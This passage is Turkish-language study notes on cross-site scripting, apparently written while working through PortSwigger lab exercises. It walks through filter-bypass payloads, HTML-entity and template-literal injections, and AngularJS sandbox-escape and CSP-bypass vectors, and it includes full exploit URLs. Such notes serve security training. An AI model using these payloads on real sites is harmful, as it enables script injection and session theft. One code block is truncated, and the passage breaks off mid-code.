![Pasted image 20250422232636.png](/img/user/resimler/Pasted%20image%2020250422232636.png)

4- `Test\payload` payload'unu göndermeyi deneyin ve backslash'in escape edilmediğini gözlemleyin.

![Pasted image 20250422232700.png](/img/user/resimler/Pasted%20image%2020250422232700.png)

5- JavaScript stringinden çıkmak ve bir `alert` enjekte etmek için inputunuzu aşağıdaki payload ile değiştirin:

```
\'-alert(1)//
```

![Pasted image 20250422232756.png](/img/user/resimler/Pasted%20image%2020250422232756.png)

6- Sağ tıklayıp “URL'yi Kopyala”yı seçerek ve URL'yi browser'a yapıştırarak tekniğin işe yaradığını doğrulayın. Sayfayı yüklediğinizde bir alert tetiklemelidir.

![Pasted image 20250422232811.png](/img/user/resimler/Pasted%20image%2020250422232811.png)

---

Bazı web siteleri, hangi karakterleri kullanmanıza izin verildiğini sınırlamak suretiyle XSS'yi daha zor hale getirmektedir. Bu, web sitesi düzeyinde veya isteklerinizin web sitesine ulaşmasını engelleyen bir WAF kullanarak olabilir. Bu gibi durumlarda, bu güvenlik önlemlerini atlatan başka fonksiyon çağırma yolları denemeniz gerekir. Bunu yapmanın bir yolu, `throw` deyimini bir exception handler ile birlikte kullanmaktır. Bu, parantez kullanmadan bir fonksiyona argüman aktarmanızı sağlar. Aşağıdaki kod `alert()` fonksiyonunu global exception handler'a atar ve `throw` deyimi `1` değerini exception handler'a (bu durumda alert) aktarır. Sonuç olarak `alert()` fonksiyonu argüman olarak `1` ile çağrılır.

```
onerror=alert;throw 1
```

Fonksiyonları parantez olmadan çağırmak için bu tekniği kullanmanın [birden fazla yolu](https://portswigger.net/research/xss-without-parentheses-and-semi-colons) vardır.

Bir sonraki laboratuvarda belirli karakterleri filtreleyen bir web sitesi gösterilmektedir. Bunu çözmek için yukarıda anlatılanlara benzer teknikler kullanmanız gerekecektir.

---

## Lab: Bazı karakterlerin engellendiği bir JavaScript URL’sinde reflected XSS.

Bu laboratuvar inputlarınızı bir JavaScript URL'sine yansıtır, ancak her şey göründüğü gibi değildir. Bu başlangıçta önemsiz bir zorluk gibi görünmektedir; ancak uygulama XSS saldırılarını önlemek amacıyla bazı karakterleri engellemektedir.

Laboratuvarı çözmek için, `alert` mesajında bir yerde bulunan `1337` stringi ile `alert` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

1- YOUR-LAB-ID yerine laboratuvar kimliğinizi yazarak aşağıdaki URL'yi ziyaret edin:

```
https://0ac4005a04903206803cd073004800f3.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

Laboratuvar çözülecektir, ancak alert yalnızca sayfanın altındaki “Bloga geri dön” seçeneğine tıkladığınızda çağrılacaktır.

![Pasted image 20250422235959.png](/img/user/resimler/Pasted%20image%2020250422235959.png)

![Pasted image 20250422235949.png](/img/user/resimler/Pasted%20image%2020250422235949.png)

![Pasted image 20250422235621.png](/img/user/resimler/Pasted%20image%2020250422235621.png)

**Exploit, `alert` fonksiyonunu argümanlarla çağırmak için exception handling (hata yakalama) mekanizmasını kullanır. `throw` ifadesi kullanılır ve boş bir yorum satırı (`/* */`) ile ayrılarak boşluk kısıtlamasını atlatmak amaçlanır. `alert` fonksiyonu, `onerror` exception handler’ına atanır.**

`throw` bir **statement (ifade)** olduğu için bir **expression (ifadeyle sonuçlanan yapı)** olarak kullanılamaz. Bu nedenle `throw` ifadesini bir **block (kod bloğu)** içinde kullanmak için **arrow function (ok fonksiyonu)** tanımlamamız gerekir. Sonrasında bu fonksiyonun çağrılması gerekir. Bunu sağlamak için fonksiyonu `window` nesnesinin `toString` özelliğine atarız ve `window` üzerinde **string dönüşümünü zorlayarak** bu özelliği tetikleriz.

#### Detaylı anlatım : 

- Bir parametre üzerinden, doğrudan **JavaScript içine reflected** bir kullanıcı input'u var.
- Ancak bazı karakterler (örneğin `()`, `space`, vs.) filtrelenmiş veya engellenmiş.
- Amaç: Bu filtreleri **bypass ederek `alert(1)` çalıştırmak**.

##### 1. **JavaScript Injection Context**:

- İnput, JavaScript içindeki bir fonksiyon çağrısına ya da objeye **inline** olarak ekleniyor.
- Bu nedenle, **string terminasyonu** (`'`) ve **kod bloğundan çıkış** için gerekli karakterlerle (örneğin `}`) injection yapılması gerekiyor.

##### 2. **JavaScript Arrow Function**:

- Normalde `x => { code }` şeklinde yazılır.
- Ancak `()` karakteri engellendiği için şu şekilde yazılıyor:

```
x = x => { code }
```

Yani tek parametreli bir arrow function tanımlanıyor.  
Bu JavaScript’te geçerli bir sözdizimi.


3. **Comma Operator (`,` Operatörü)**:

JavaScript’te `,` operatörü birden fazla ifadeyi ayırmaya yarar ama **sadece sonuncusunun değeri kullanılır**.

```
throw (a = 1, 1337)
```

Burada `a = 1` atanır ama `1337` fırlatılır.  
Bu şekilde **birden fazla ifade** çalıştırılabilir, ama sadece sonuncusu "etkin" olur.

##### 4. **`throw` ile Kod Çalıştırma**:

- `throw` ifadesi hata fırlatır.
- Fakat burada amaç: throw içine, **kod çalıştıran assignment** koymak:

```
throw /*comment*/ onerror=alert, 1337
```

Engellenen `space` karakteri yerine `/**/` kullanılmış.  
Bu bir **"obfuscation" tekniği**.  
Yani `onerror=alert` ifadesi yorumlayıcıya düzgün geçsin diye kullanılıyor.


##### 5. **`onerror=alert` Ne Anlama Geliyor?**

- `onerror` global bir handler’dır.
- DOM elementlerine değil, doğrudan **global error handler** olarak atanabilir.

```
onerror = alert
```

- Bu atama sayesinde tarayıcıda meydana gelen hatalar `alert` ile yakalanır.
- Yani sonraki `throw` ifadesi hata üretince, `alert` tetiklenir.

##### Payload Yapısı (Özet)

```
'postId=100&'+ '}' + ",'" +
'x=x=>{throw/**/onerror=alert,1337},toString=x,window+\'\',{x:\''
```

- `'}` → String ve obje kapatmak için (injection context çıkışı)
- `x=x=>{...}` → Arrow function tanımı
- `throw/**/onerror=alert,1337` → `onerror`'e `alert` atayıp sonra hata fırlatma
- `toString=x` → Parametre bypass (gereksiz ama `fetch` gibi fonksiyonlara uygunluk)
- `window+''` → Gereksiz ama sözdizimini bozmamak için
- `{x:'` → Kodun kalan kısmı düzgün kapansın diye yapılıyor (syntax tamamlanıyor)


##### Kullanılan Bypass Yöntemleri:

|Engellenen Durum|Bypass Tekniği|
|---|---|
|`()` parantezleri|Arrow function'da tek parametreli tanım (`x =>`)|
|`space` karakteri|`/**/` yorum bloğu ile boşluk taklidi|
|Fonksiyon çağrısı|`throw` ile tetikleme ve `onerror=alert`|
|Argument limitasyonu|`,` operatörü ile çoklu ifade işleme|


Bu labdeki XSS, klasik `<script>alert(1)</script>` gibi çalışmaz. Bunun yerine:

- JavaScript’in **fonksiyonel sözdizimi**
- `throw` ve `onerror` gibi **yerleşik global yapıların kötüye kullanımı**
- Ve `,` operatörü ile **çoklu işlemi tek satırda işleme**

kullanılarak çalışan, gelişmiş bir **JavaScript tabanlı Reflected XSS** gerçekleştirilmiş olur.

---

## HTML-encoding'dan yararlanma

XSS context, bir event handler gibi quoted tag attribute içindeki mevcut bir JavaScript olduğunda, bazı input filtrelerinin etrafından dolaşmak için HTML-encoding kullanmak mümkündür.

Tarayıcı bir response içindeki HTML tag'lerini ve attribute'lerini ayrıştırdığında, tag attribute değerleri daha fazla işlenmeden önce HTML-decoding işlemini gerçekleştirecektir. Server side uygulaması başarılı bir XSS exploit'i için gerekli olan belirli karakterleri engelliyor veya sterilize ediyorsa, bu karakterleri HTML-encoding yaparak input validasyonunu genellikle atlayabilirsiniz.

Örneğin, XSS context aşağıdaki gibi ise:

```
<a href="#" onclick="... var input='controllable data here'; ...">
```

ve uygulama tek tırnak karakterlerini engeller veya escapes, JavaScript string'inden çıkmak ve kendi script'inizi çalıştırmak için aşağıdaki payload'u kullanabilirsiniz:

```
&apos;-alert(document.domain)-&apos;
```

`&apos;` sequence kesme işaretini veya tek tırnak işaretini temsil eden bir HTML varlığıdır. Tarayıcı, JavaScript yorumlanmadan önce `onclick` attribute'unun değerini HTML decode ettiğinden, entity'ler tırnak işaretleri olarak decode edilir ve bunlar string sınırlayıcıları (delimiters) haline gelir ve böylece saldırı başarılı olur.

---

## HTML encoded köşeli parantezler (`<`, `>`) ve çift tırnaklar (`"`), kaçış karakteriyle (`\`) kaçırılmış tek tırnak (`'`) ve ters bölü (`\`) içeren bir `onclick` event'ine  Stored XSS enjeksiyonu


Bu laboratuvar, comment (yorum) fonksiyonunda stored cross-site scripting vulnerability içermektedir.

Bu laboratuvarı çözmek için, comment author name tıklandığında `alert` fonksiyonunu çağıran bir comment gönderin.

1- “Web Sitesi” girişine rastgele bir alfanümerik string içeren bir yorum gönderin, ardından request'i intercept etmek ve Burp Repeater'a göndermek için Burp Suite'i kullanın.

2-Gönderiyi görüntülemek için tarayıcıda ikinci bir request'de bulunun ve bu request'i kesip Burp Repeater'a göndermek için Burp Suite'i kullanın.

3- İkinci Repeater sekmesindeki rastgele stringin bir `onclick` event handler attribute içinde yansıtıldığını gözlemleyin.

![Pasted image 20250423001757.png](/img/user/resimler/Pasted%20image%2020250423001757.png)

4- İşlemi tekrarlayın ancak bu kez aşağıdaki payload'u kullanarak `alert`'i çağıran bir JavaScript URL'si enjekte etmek için girdinizi değiştirin:

```
http://foo?&apos;/-alert(1)-&apos;
```


![Pasted image 20250423002901.png](/img/user/resimler/Pasted%20image%2020250423002901.png)

![Pasted image 20250423002841.png](/img/user/resimler/Pasted%20image%2020250423002841.png)

![Pasted image 20250423002813.png](/img/user/resimler/Pasted%20image%2020250423002813.png)

5- Sağ tıklayıp “URL'yi Kopyala ”yı seçerek ve URL'yi tarayıcıya yapıştırarak tekniğin işe yaradığını doğrulayın. Yorumunuzun üzerindeki isme tıkladığınızda bir `alert`'i tetiklenmelidir.

#### Özet : 

- Stored XSS zafiyeti, `onclick` olaylarında angle braketler (`<`, `>`), çift tırnak (`"`) HTML encode edilmiş, tek tırnak (`'`) ve backslash (`\`) escape edilmiş bir ortamda.

- **Kısıtlamalar**:
  - Angle braketler (`<`, `>`) ve çift tırnak (`"`) HTML encode ediliyor.
  - Tek tırnak (`'`) backslash ile escape ediliyor.
  - Bu, standart XSS saldırılarını (örn. `<script>alert()</script>`) engelliyor.

  - Yorum gönderildiğinde, website URL'si blog sayfasında bir bağlantı (`<a>` tag'ı) olarak görünür.
  - URL, iki yerde yansıtılıyor:
    1. `<a>` tag'ının `href` attribute'u.
    2. JavaScript içinde `tracker.track('URL')` fonksiyonunun argümanı olarak.

##### **Potansiyel Saldırı Vektörleri**

1. **Href Attribute'u**:
   - Çift tırnak (`"`) ile `href` attribute'undan çıkıp yeni attribute ekleme (örn. `onmouseover`).
   - Sorun: Çift tırnak HTML encode ediliyor (`&quot;` olur).
2. **Script Enjeksiyonu**:
   - `<script>alert()</script>` gibi script tag'ı enjeksiyonu.
   - Sorun: Angle braketler HTML encode ediliyor (`&lt;`, `&gt;` olur).
3. **JavaScript String Kaçışı**:
   - `tracker.track` fonksiyonundaki string'den tek tırnak (`'`) ile çıkıp `alert()` çağırma.
   - Sorun: Tek tırnak backslash ile escape ediliyor (`\'` olur).

##### **Başarısız Saldırı Denemesi**

- **Örnek Payload**:

  ```json
  {"website": "http://evil.com';alert();'"}
  ```
  
  - Amaç: `tracker.track('http://evil.com';alert();')` oluşturmak.
  - **Sonuç**:
    - Sunucu tek tırnağı escape ediyor: `http://evil.com\';alert();\'`.
    - JavaScript string'i kırılamıyor, payload string'in bir parçası olarak kalıyor.
    - DOM'da: `tracker.track('http://evil.com\';alert();\'')`.
  - **Neden Başarısız?**: Sunucu, tek tırnakları manuel olarak escape ediyor.

#### **Zafiyetin Keşfi**

- **Varsayım**: Sunucu, özel karakterleri (örn. `'`) manuel olarak escape ediyor, ancak HTML encode edilmiş değerleri (`&apos;`) göz ardı ediyor olabilir.
- **Yeni Strateji**: Tek tırnak yerine HTML encode edilmiş tek tırnak (`&apos;`) kullanmak.
  - **Neden?**:
    - Sunucu, `&apos;`yi tek tırnak olarak algılamaz ve escape etmez.
    - Tarayıcı, HTML bağlamında `&apos;`yi `'` olarak çözer, bu da JavaScript string'ini kırar.

#### **Başarılı Payload**

- **Payload**:

  ```json
  {"website": "http://foo?&apos;-alert()-&apos;"}
  ```
  
  - **Amaç**:
    - `http://foo?` → Meşru bir URL başlangıcı (front-end doğrulamayı geçmek için).
    - `&apos;` → HTML encode edilmiş tek tırnak, tarayıcıda `'` olur.
    - `-alert()-` → String kırıldığında `alert()` fonksiyonunu çağırır.
    - `&apos;` → İkinci tek tırnak, sunucunun eklediği sondaki `'`yi absorbe eder.
  
  - **DOM'daki Sonuç**:

    ```html
    <a onclick="tracker.track('http://foo?'-alert()-'')">
    ```
    
	- `&apos;` tarayıcıda `'` olur, string erken biter.
    - `alert()` çalışır, ardından boş string (`''`) gelir.
  - **Sonuç**: XSS zafiyeti tetiklenir, `alert()` pop-up'ı görünür.

#### **Post Analiz**
- **Neden Çalıştı?**:
  - Sunucu, `&apos;`yi escape etmedi çünkü bunu tek tırnak olarak algılamadı.
  - Tarayıcı, HTML bağlamında `&apos;`yi `'` olarak çözdü.
  - `onclick` özniteliği bir HTML bağlamında olduğu için HTML decoding gerçekleşti.
- **Raw HTML** (Sunucudan gelen):
  ```html
  <a href="http://foo?&apos;-alert()-&apos;" onclick="tracker.track('http://foo?&apos;-alert()-&apos;')">
  ```
  - Sunucu, `&apos;`yi olduğu gibi gönderir.
- **DOM** (Tarayıcıda):
  ```html
  <a href="http://foo?'-alert()-'" onclick="tracker.track('http://foo?'-alert()-'')">
  ```
  - Tarayıcı, `&apos;`yi `'` olarak çözer, bu da JavaScript string'ini kırar.
- **Kritik Nokta**:
  - Zafiyet, HTML bağlamında (`onclick` attribute'u) olduğu için HTML encode edilmiş değerler tarayıcı tarafından çözülüyor.
  - Saf JavaScript bağlamında bu çalışmazdı (örn. `<script>` içinde).

#### **Ek Notlar**
- **Sunucu-Side Farkı**:
  - Sunucu, `&apos;`yi HTML encode edilmiş bir değer olarak gönderir, bunun `'` olduğunu bilmez.
  - Tarayıcı, HTML'i işlerken `&apos;`yi `'` olarak decode eder, bu da zafiyeti yaratır.
- **Bağlamın Önemi**:
  - XSS, `onclick` gibi HTML bağlamlarında HTML encoding ile manipüle edilebilir.
  - JavaScript bağlamında (örn. `<script>` içinde) HTML encoding işe yaramaz.
- **Front-end Doğrulama**:
  - Meşru bir URL başlangıcı (`http://foo`) eklemek, front-end doğrulamayı geçmek için gerekliydi.
  - Proxy (örn. Burp Suite) kullanılsa, bu doğrulama atlanabilirdi.

----

## JavaScript template literals'da XSS

JavaScript template literals, gömülü JavaScript ifadelerine izin veren string literallerdir. Gömülü ifadeler değerlendirilir ve normalde çevreleyen metinle birleştirilir. Template literals normal tırnak işaretleri yerine backtick'lerle kapsüllenir ve gömülü ifadeler `${...}` sözdizimi kullanılarak tanımlanır.

Örneğin, aşağıdaki kod kullanıcının görünen adını içeren bir karşılama mesajı yazdıracaktır:

```
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

XSS context bir JavaScript template literal içinde olduğunda, literali sonlandırmaya gerek yoktur. Bunun yerine, literal işlendiğinde yürütülecek bir JavaScript ifadesini gömmek için `${...}` syntax'ını kullanmanız yeterlidir. Örneğin, XSS context aşağıdaki gibi ise:

```
<script>
...
var input = `controllable data here`;
...
</script>
```

sonra template literal'i sonlandırmadan JavaScript'i çalıştırmak için aşağıdaki payload'u kullanabilirsiniz:

```
${alert(document.domain)}
```

---

## Laboratuvar: Açı parantezleri, tek tırnak, çift tırnak, ters eğik çizgi ve ters tırnakların Unicode-escaped dizileriyle kodlandığı bir template literal reflected XSS


1- Search box'a rastgele bir alfanümerik string gönderin, ardından Search Request'i kesmek ve Burp Repeater'a göndermek için Burp Suite'i kullanın.

2- Rastgele stringin bir JavaScript template stringi içinde yansıtıldığını gözlemleyin.

![Pasted image 20250423004112.png](/img/user/resimler/Pasted%20image%2020250423004112.png)

3- Template string içinde JavaScript çalıştırmak için input'unuzu aşağıdaki payload ile değiştirin: `${alert(1)}`

![Pasted image 20250423004142.png](/img/user/resimler/Pasted%20image%2020250423004142.png)

4- Sağ tıklayıp "Copy URL" seçerek ve URL'yi tarayıcıya yapıştırarak tekniğin çalıştığını doğrulayın. Sayfayı yüklediğinizde bir `alert` tetiklemelidir.

### Özet : 

##### **Template Literal (Şablon Dize) Nedir?**

JavaScript’te üç şekilde string tanımlanabilir:

- `'tek tırnak'`
- `"çift tırnak"`
- `` `backtick` `` (template literal)

**Template literal** yani `` `backtick` `` ile yazılan stringlerin iki önemli özelliği vardır:

1. **Çok satırlı metin** yazılabilir.
2. **String interpolation** yapılabilir (değişken gömme).

##### Örnek:

```
let name = "Ali";
let msg = `Merhaba, ${name}!`;
```

`${name}` ifadesi, string içinde JavaScript değişkenini çalıştırarak `"Merhaba, Ali!"` sonucunu üretir.

Sayfaya yapılan bir arama sorgusu, DOM içinde bir yerde **template literal** (`'`) ile tanımlanan bir string içinde yansıtılıyor:

```
const message = `Your search term was: ${userInput}`;
```

Bu şu anlama geliyor:
- Kullanıcıdan gelen `userInput` doğrudan `backtick` (`'`) içinde yer alıyor.
- Ve bu içerikte **`${...}`** şeklinde bir ifade girilirse, JavaScript bunu **çalıştırıyor!**


XSS Saldırısı Nasıl Gerçekleştirildi? --> Kullanıcı, arama yerine şu şekilde bir input gönderdi:

```
${alert(1)}
```

Bu değer `message` değişkeninde şöyle yer aldı:

```
const message = `Your search term was: ${alert(1)}`;
```

JavaScript bunu yorumladığında, **`alert(1)` fonksiyonu çalıştı** ve XSS saldırısı başarılı oldu.

- Template literal kullanmak bazen daha okunaklı kod yazmamıza olanak tanır ama **güvenlik açısından dikkatli kullanılmalıdır.**

- İçine kullanıcı verisi gömülecekse `${}` içine zararlı kod çalıştırılması engellenmelidir.

- Normal `'` veya `"` kullanılsaydı bu saldırı çalışmayabilirdi çünkü string interpolation sadece backtick (`) içinde geçerlidir.

Bu lab çalışması, **JavaScript template literal yapısının nasıl XSS açığına neden olabileceğini** gösteriyor. Özellikle `${}` yapısının içerisine çalıştırılabilir kod sokulabildiği için, kullanıcı girdilerinin bu tür yerlere doğrudan yerleştirilmesi çok tehlikelidir.

---

### Client Side template injection yoluyla XSS

Bazı web siteleri, web sayfalarını dinamik olarak oluşturmak için AngularJS gibi bir client-side template framework kullanır. Kullanıcı inputunu bu template'lere güvenli olmayan bir şekilde yerleştirirlerse, bir saldırgan XSS saldırısı başlatan kendi kötü niyetli template ifadelerini enjekte edebilir.

https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection

## Client-side template injection

Bu bölümde, client-side template injection güvenlik açıklarına ve XSS saldırıları için bunlardan nasıl yararlanabileceğinize bakacağız. Bu saldırı tekniği araştırma ekibimiz tarafından öncülük edilmiştir -[ daha fazlasını HTML'siz XSS'de okuyun: AngularJS ile client side template injection](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs). Client taraflı template injection genel bir sorun olmasına rağmen, en yaygın olanı AngularJS framework'ünden örneklere odaklanacağız. AngularJS sandbox'ından kaçabilecek exploit'leri nasıl oluşturabileceğinizi ve Content Security Policy'yi (CSP) atlamak için AngularJS özelliklerini potansiyel olarak nasıl kullanabileceğinizi açıklayacağız.


### Client-side template enjeksiyonu nedir?

Client-side template injection vulnerabilities, client-side template framework kullanan uygulamalar kullanıcı inputlarını dinamik olarak web sayfalarına gömdüğünde ortaya çıkar. Bir sayfa oluşturulurken, framework sayfayı template ifadeleri için tarar ve karşılaştığı ifadeleri yürütür. Bir saldırgan, bir cross-site scripting (XSS) saldırısı başlatan kötü niyetli bir template ifadesi sağlayarak bu durumdan faydalanabilir.

### AngularJS sandbox nedir?

AngularJS sandbox, AngularJS template expression'larında `window` veya `document` gibi potansiyel olarak tehlikeli objelere erişimi engelleyen bir mekanizmadır. Ayrıca `__proto__` gibi potansiyel olarak tehlikeli özelliklere erişimi de engeller. AngularJS ekibi tarafından bir güvenlik sınırı olarak görülmemesine rağmen, daha geniş geliştirici topluluğu genellikle aksini düşünmektedir. Sandbox'ı aşmak başlangıçta zor olsa da, güvenlik araştırmacıları bunu yapmanın çok sayıda yolunu keşfetti. Sonuç olarak, en sonunda `1.6` sürümünde AngularJS'den kaldırıldı. Bununla birlikte, birçok eski uygulama hala AngularJS'nin eski sürümlerini kullanmaktadır ve sonuç olarak savunmasız olabilir.

### AngularJS sandbox nasıl çalışır?

Sandbox, bir ifadeyi parse ederek, JavaScript'i yeniden yazarak ve ardından yeniden yazılan kodun herhangi bir tehlikeli obje içerip içermediğini test etmek için çeşitli fonksiyonlar kullanarak çalışır. Örneğin, `ensureSafeObject()` fonksiyonu belirli bir objenin kendisine referans verip vermediğini kontrol eder. Bu, örneğin `window` objesini tespit etmenin bir yoludur. `Fonksiyon` constructor'ı da aşağı yukarı aynı şekilde, constructor özelliğinin kendisine referans verip vermediği kontrol edilerek tespit edilir.

`ensureSafeMemberName()` fonksiyonu objenin her bir özellik erişimini kontrol eder ve `__proto__` veya `__lookupGetter__` gibi tehlikeli özellikler içeriyorsa, obje engellenir. `ensureSafeFunction()` fonksiyonu `call()`, `apply()`, `bind()` veya `constructor()` fonksiyonlarının çağrılmasını engeller.

Bu [fiddle'ı](https://jsfiddle.net/2zs2yv7o/1/) ziyaret ederek ve `angular.js` dosyasının 13275. satırında bir breakpoint ayarlayarak sandbox'ı kendi gözlerinizle görebilirsiniz. `fnString` değişkeni yeniden yazdığınız kodu içerir, böylece AngularJS'nin bunu nasıl dönüştürdüğüne bakabilirsiniz.


### AngularJS sandbox escape nasıl çalışır?

Sandbox escape, malicious expression'ın iyi huylu olduğunu düşünmesi için sandbox'ı kandırmayı içerir. En iyi bilinen escape, bir ifade içinde genel olarak değiştirilmiş `charAt()` fonksiyonunu kullanır:

```
'a'.constructor.prototype.charAt=[].join
```

İlk keşfedildiğinde, AngularJS bu değişikliği engellememiştir. Saldırı, `charAt()` fonksiyonunun belirli bir tek karakter yerine kendisine gönderilen tüm karakterleri döndürmesine neden olan `[].join` yöntemini kullanarak fonksiyonun üzerine yazılmasıyla çalışır. AngularJS'deki `isIdent()` fonksiyonunun mantığı nedeniyle, tek bir karakter olduğunu düşündüğü şeyi birden fazla karakterle karşılaştırır. Tek karakterler her zaman çoklu karakterlerden daha az olduğundan, `isIdent()` fonksiyonu aşağıdaki örnekte gösterildiği gibi her zaman true değerini döndürür:

```
isIdent = function(ch) {
    return ('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' || '_' === ch || ch === '

`isIdent()` fonksiyonu aldatıldığında, kötü amaçlı JavaScript enjekte edebilirsiniz. Örneğin, `$eval(‘x=alert(1)’)` gibi bir ifadeye izin verilebilir çünkü AngularJS her karakteri bir identifier olarak ele alır. AngularJS'nin `$eval()` fonksiyonunu kullanmamız gerektiğini unutmayın, çünkü `charAt()` fonksiyonunun üzerine yazmak yalnızca sandbox'lı kod yürütüldüğünde etkili olacaktır. Bu teknik daha sonra sandbox'ı atlayacak ve keyfi JavaScript yürütülmesine izin verecektir. [PortSwigger Research, AngularJS sandbox'ını kapsamlı bir şekilde, birden çok kez kırmıştır](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs).


### Gelişmiş bir AngularJS sandbox escape oluşturma

Temel bir sandbox escape'in nasıl çalıştığını öğrendiniz, ancak hangi karakterlere izin verdikleri konusunda daha kısıtlayıcı olan sitelerle karşılaşabilirsiniz. Örneğin, bir site çift veya tek tırnak işareti kullanmanızı engelleyebilir. Bu durumda, karakterlerinizi oluşturmak için `String.fromCharCode()` gibi fonksiyonları kullanmanız gerekir. AngularJS bir expression içinde `String` constructor'a erişimi engellese de, bunun yerine bir string'in constructor özelliğini kullanarak bunu aşabilirsiniz. Bu açıkça bir string gerektirir, bu nedenle böyle bir saldırı oluşturmak için tek veya çift tırnak kullanmadan bir string oluşturmanın bir yolunu bulmanız gerekir.

Standart bir sandbox escape'te, JavaScript payload'unuzu çalıştırmak için `$eval()` fonksiyonunu kullanırsınız, ancak aşağıdaki laboratuvarda `$eval()` fonksiyonu tanımsızdır. Neyse ki, bunun yerine `orderBy` filtresini kullanabiliriz. Bir `orderBy` filtresinin tipik sözdizimi aşağıdaki gibidir:

```
[123]|orderBy:'Some string'
```

`|` operatörünün JavaScript'tekinden farklı bir anlamı olduğuna dikkat edin. Normalde, bu bir bitsel `OR` işlemidir, ancak AngularJS'de bir filtre işlemini belirtir. Yukarıdaki kodda, soldaki `[123]` array'ini sağdaki `orderBy` filtresine gönderiyoruz. İki nokta üst üste, bu durumda bir string olan filtreye gönderilecek bir argümanı belirtir. `orderBy` filtresi normalde bir objeyi sıralamak için kullanılır, ancak aynı zamanda bir ifadeyi de kabul eder, bu da onu bir payload iletmek için kullanabileceğimiz anlamına gelir.

Artık bir sonraki laboratuvarın üstesinden gelmek için ihtiyacınız olan tüm araçlara sahip olmalısınız.

----

## Laboratuvar: AngularJS sandbox escape ile stringler olmadan Reflected XSS

Bu laboratuvar, AngularJS'yi `$eval` fonksiyonunun kullanılamadığı alışılmadık bir şekilde kullanır ve AngularJS'de herhangi bir string kullanamazsınız.

Laboratuvarı çözmek için, sandbox'tan kaçan ve `$eval` fonksiyonunu kullanmadan `alert` fonksiyonunu çalıştıran bir cross-site scripting saldırısı gerçekleştirin.

Hızlı Çözüm : 

1- `YOUR-LAB-ID` yerine laboratuvar kimliğinizi yazarak aşağıdaki URL'yi ziyaret edin:

```
https://0a9900ec031dc7c080b9120400a000be.web-security-academy.net//?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

![Pasted image 20250423182417.png](/img/user/resimler/Pasted%20image%2020250423182417.png)

![Pasted image 20250423182442.png](/img/user/resimler/Pasted%20image%2020250423182442.png)

Exploit, tırnak işareti kullanmadan bir `string` oluşturmak için `toString()` fonksiyonunu kullanır. Daha sonra String prototipini alır ve her string için `charAt` fonksiyonunun üzerine yazar. Bu, AngularJS sandbox'ını etkili bir şekilde kırar. Ardından, `orderBy` filtresine bir array aktarılır. Daha sonra bir string oluşturmak için yine `toString()` ve `String` constructor özelliğini kullanarak filtre için argümanı ayarlarız. Son olarak, `fromCharCode` yöntemini kullanarak karakter kodlarını `x=alert(1)` stringine dönüştürerek payload'umuzu oluşturuyoruz. `charAt` fonksiyonunun üzerine yazıldığı için, AngularJS normalde izin vermeyeceği bu koda izin verecektir.

---

### AngularJS CSP bypass nasıl çalışır?

Content security policy (CSP) bypass'ları standart sandbox escape'lerine benzer şekilde çalışır, ancak genellikle bazı HTML enjeksiyonları içerir. AngularJS'de CSP modu etkin olduğunda, template ifadelerini farklı şekilde parse eder ve `Function` constructor'ı kullanmaktan kaçınır. Bu, yukarıda açıklanan standart sandbox escape'in artık çalışmayacağı anlamına gelir.

Belirli politikaya bağlı olarak, CSP JavaScript event'lerini engelleyecektir. Ancak, AngularJS bunun yerine kullanılabilecek kendi event'lerini tanımlar. Bir event içindeyken AngularJS, basitçe tarayıcı event objesine referans veren özel bir `$event` objesi tanımlar. Bu objeyi CSP bypass'ı gerçekleştirmek için kullanabilirsiniz. Chrome'da, `" $event/event "` objesinde `path` adında özel bir özellik vardır. Bu özellik, event'in yürütülmesine neden olan bir array obje içerir. Son özellik her zaman bir sandbox escape gerçekleştirmek için kullanabileceğimiz `window` objesidir. Bu array'i orderBy filtresine geçirerek, array'i numaralandırabilir ve `alert()` gibi global bir fonksiyonu çalıştırmak için son elemanı (`window` object) kullanabiliriz. Aşağıdaki kod bunu göstermektedir:

```
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```

Bir objeyi bir array'e dönüştürmenize ve bu array'in her elemanı üzerinde belirli bir fonksiyonu (ikinci argümanda belirtilen) çağırmanıza olanak tanıyan `from()` fonksiyonunun kullanıldığına dikkat edin. Bu durumda `alert()` fonksiyonunu çağırıyoruz. Fonksiyonu doğrudan çağıramayız çünkü AngularJS sandbox kodu parse eder ve `window` objesinin bir fonksiyon çağırmak için kullanıldığını tespit eder. Bunun yerine from() fonksiyonunu kullanmak, `window` objesini sandbox'tan etkili bir şekilde gizleyerek kötü amaçlı kod eklememize olanak tanır.

[PortSwigger Research, bu tekniği kullanarak 56 karakterde AngularJS kullanarak bir CSP baypası oluşturdu.](https://portswigger.net/research/angularjs-csp-bypass-in-56-characters)


### AngularJS sandbox escape ile bir CSP'yi bypass etme

Sıradaki laboratuvar bir uzunluk kısıtlaması kullanmaktadır, bu nedenle yukarıdaki vektör çalışmayacaktır. Bu laboratuvardan yararlanmak için, `window` objesini AngularJS sandbox'ından gizlemenin çeşitli yollarını düşünmeniz gerekir. Bunu yapmanın bir yolu `array.map()` fonksiyonunu aşağıdaki gibi kullanmaktır:

```
[1].map(alert)
```

`map()` bir fonksiyonu argüman olarak kabul eder ve array'deki her item için onu çağırır. Bu, `alert()` fonksiyonuna yapılan referans `window`'a açıkça referans verilmeden kullanıldığından sandbox'ı atlayacaktır. Laboratuvarı çözmek için, `alert()` fonksiyonunu AngularJS'nin `window` detection özelliğini tetiklemeden çalıştırmanın çeşitli yollarını deneyin.

---

## Lab: Reflected XSS with AngularJS sandbox escape and CSP

Bu laboratuvarda CSP ve AngularJS kullanılmaktadır.

Laboratuvarı çözmek için CSP'yi baypas eden, AngularJS sandbox'ından kaçan ve document.cookie'yi alert eden bir cross-site scripting saldırısı gerçekleştirin.

1- Exploit sunucusuna gidin ve aşağıdaki kodu YOUR-LAB-ID yerine laboratuvar kimliğinizi yazarak yapıştırın:

```
<script>
